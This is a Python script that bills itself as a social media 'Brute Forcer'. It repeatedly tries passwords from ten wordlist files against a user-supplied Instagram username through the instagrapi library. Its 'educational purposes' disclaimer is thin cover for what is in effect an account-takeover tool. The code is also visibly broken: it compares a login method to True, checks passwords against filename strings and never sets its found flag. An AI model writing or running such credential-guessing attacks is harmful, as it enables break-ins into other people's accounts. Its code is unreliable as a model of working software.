"""
Author: @new92
Brute Forcer: Program for Brute Forcing Social Media Accounts
Not for illegal purposes !
The author is not responsible for any illegal activities carried out using this program !!
User's data (such as: username and/or password) will not be stored or saved !
The author's not responsible for any damages may cause the program in the given accounts.
"""
#Imports
try:
    import sniffer
    import socket
    import http
    import websockets
    import webbrowser
    import bottle_websocket
    import requests
    import phonenumbers
    import tkinter
    import time
    import geocoder
    import sys
    import os
    import signal
    import csv
    import instagrapi
    from tkinter import messagebox
except ImportError as imp:
    tkinter.messagebox.error("Error !","You haven't installed all the modules used on this program")
    print("Please enter the command: pip3 install -r requirementsA.txt")
    time.sleep(2)
#End of Import

#Use
tkinter.messagebox.showinfo("Use !","This program has been created only for educational purposes! If this program is used for malicious purposes the author has no responsibility !")

#Logo
print("""
          d8888                   888      d8b
         d88888                   888      Y8P
        d88P888                   888
       d88P 888 88888b.  888  888 88888b.  888 .d8888b
      d88P  888 888 "88b 888  888 888 "88b 888 88K
     d88P   888 888  888 888  888 888  888 888 "Y8888b.
    d8888888888 888  888 Y88b 888 888 d88P 888      X88
   d88P     888 888  888  "Y88888 88888P"  888  88888P'
""")

#Main Program

print("[+] Github: @new92")
print("\n")
print("[01] Brute Force Account")
print("[02] Exit")
print("\n")
option=input("[::] Choose an option: ")

while option != "01" and option != "02" and option != "1" and option != "2":
    print("Invalid option !")
    option=input("[::] Please enter again: ")
if option == "01" or option == "1":
    user=input("Please enter the username of the account you want to Brute Force: ")
    username = user.lower()
    username = username.strip()
    clnt=instagrapi.Client()
    f = open("pswrd.txt", encoding="utf8")
    #file = len(f)
    Found = False
    L = f.readlines()
    f.seek(0)
    LINES = len(L)
    
    for j in range(1,LINES + 1):
        try:
            content = f.readline()
            content = content.strip()
            print("\n")
            password = content
            clnt.login(username,password)
        except Exception as ex:
            continue
    if clnt.login == True:
       print("Password Found: "+str(Found))
       time.sleep(1)
       print(password)
    #else:
        
    if password not in "pswrd.txt":
        f.close()
        print("Password Found in File 1: "+str(Found))
        time.sleep(2)
        print("Continuing Brute Force with File 2...")
        time.sleep(2)
        n = open("pswrd1.txt","r")
        L = n.readlines()
        n.seek(0)
        LINES = len(L)
        n.seek(0)
        for b in range(LINES):
            try:
                for j in range(LINES):
                    content1 = n.readline()
                    content1 = content1.strip()
                    print("\n")
                    password1 = content1
                    clnt.login(username,password1)
            except Exception as ex:
                continue
            if clnt.login == True:
                print("Password Found: "+str(Found))
                time.sleep(1)
                print(password1)
            else:
                continue
    if password1 not in "pswrd1.txt":
        n.close()
        print("Password Found in File 2: "+str(Found))
        time.sleep(2)
        print("Continuing Brute Force with File 3...")
        time.sleep(2)
        c = open("pswrd2.txt","r")
        cile = len("pswrd2.txt")
        for h in range(cile):
            try:
                for j in range(cile):
                    content2 = c.readline()
                    content2 = content2.strip()
                    print("\n")
                    password2 = content2
                    clnt.login(username,password2)
            except Exception as ex:
                continue
            if clnt.login == True:
                print("Password Found: "+str(Found))
                time.sleep(1)
                print(password2)
            else:
                continue
    if password2 not in "pswrd2.txt":
        c.close()
        print("Password Found in File 3: "+str(Found))
        time.sleep(2)
        print("Continuing Brute Force with File 4...")
        time.sleep(2)
        m = open("pswrd3.txt","r")
        mile = len("pswrd3.txt")
        for h in range(mile):
            try:
                for j in range(mile):
                    content3 = m.readline()
                    content3 = content3.strip()
                    print("\n")
                    password3 = content3
                    clnt.login(username,password3)
            except Exception as ex:
                continue
            if clnt.login == True:
                print("Password Found: "+str(Found))
                time.sleep(1)
                print(password3)
            else:
                continue
    if password3 not in "pswrd3.txt":
        m.close()
        print("Password Found in File 4: "+str(Found))
        time.sleep(2)
        print("Continuing Brute Force with File 5...")
        time.sleep(2)
        g = open("pswrd4.txt","r")
        gile = len("pswrd4.txt")
        for h in range(gile):
            try:
                for j in range(gile):
                    content4 = g.readline()
                    content4 = content4.strip()
                    print("\n")
                    password4 = content4
                    clnt.login(username,password4)
            except Exception as ex:
                continue
            if clnt.login == True:
                print("Password Found: "+str(Found))
                time.sleep(1)
                print(password4)
            else:
                continue
    if password4 not in "pswrd4.txt":
        g.close()
        print("Password Found in File 5: "+str(Found))
        time.sleep(2)
        print("Continuing Brute Force with File 6...")
        time.sleep(2)
        z = open("pswrd5.txt","r")
        zile = len("pswrd5.txt")
        for q in range(zile):
            try:
                for j in range(zile):
                    content5 = z.readline()
                    content5 = content5.strip()
                    print("\n")
                    password5 = content5
                    clnt.login(username,password5)
            except Exception as ex:
                continue
            if clnt.login == True:
                print("Password Found: "+str(Found))
                time.sleep(1)
                print(password5)
            else:
                continue
    if password5 not in "pswrd5.txt":
        z.close()
        print("Password Found in File 6: "+str(Found))
        time.sleep(2)
        print("Continuing Brute Force with File 7...")
        time.sleep(2)
        t = open("pswrd6.txt","r")
        tile = len("pswrd6.txt")
        for q in range(tile):
            try:
                for j in range(tile):
                    content6 = t.readline()
                    content6 = content6.strip()
                    print("\n")
                    password6 = content6
                    clnt.login(username,password6)
            except Exception as ex:
                continue
            if clnt.login == True:
                print("Password Found: "+str(Found))
                time.sleep(1)
                print(password6)
            else:
                continue
    if password6 not in "pswrd6.txt":
        t.close()
        print("Password Found in File 7: "+str(Found))
        time.sleep(2)
        print("Continuing Brute Force with File 8...")
        time.sleep(2)
        y = open("pswrd7.txt","r")
        yile = len("pswrd7.txt")
        for q in range(yile):
            try:
                for j in range(yile):
                    content7 = y.readline()
                    content7 = content7.strip()
                    print("\n")
                    password7 = content7
                    clnt.login(username,password7)
            except Exception as ex:
                continue
            if clnt.login == True:
                print("Password Found: "+str(Found))
                time.sleep(1)
                print(password7)
            else:
                continue
    if password7 not in "pswrd7.txt":
        y.close()
        print("Password Found in File 8: "+str(Found))
        time.sleep(2)
        print("Continuing Brute Force with File 9...")
        time.sleep(2)
        p = open("pswrd8.txt","r")
        pile = len("pswrd8.txt")
        for q in range(pile):
            try:
                for j in range(pile):
                    content8 = p.readline()
                    content8 = content8.strip()
                    print("\n")
                    password8 = content8
                    clnt.login(username,password8)
            except Exception as ex:
                continue
            if clnt.login == True:
                print("Password Found: "+str(Found))
                time.sleep(1)
                print(password8)
            else:
                continue
    if password8 not in "pswrd8.txt":
        p.close()
        print("Password Found in File 9: "+str(Found))
        time.sleep(2)
        print("Continuing Brute Force with File 10...")
        time.sleep(2)
        d = open("pswrd9.txt","r")
        dile = len("pswrd9.txt")
        for q in range(dile):
            try:
                for j in range(dile):
                    content9 = d.readline()
                    content9 = content9.strip()
                    print("\n")
                    password9 = content9
                    clnt.login(username,password9)
            except Exception as ex:
                continue
            if clnt.login == True:
                print("Password Found: "+str(Found))
                time.sleep(1)
                print(password9)
            else:
                continue
    if password9 not in "pswrd9.txt":
        print("Password Found: "+str(Found))
        time.sleep(2)
        exit(0)
else:
    print("Exiting...")
    time.sleep(2)
    quit(0)
#End of the program
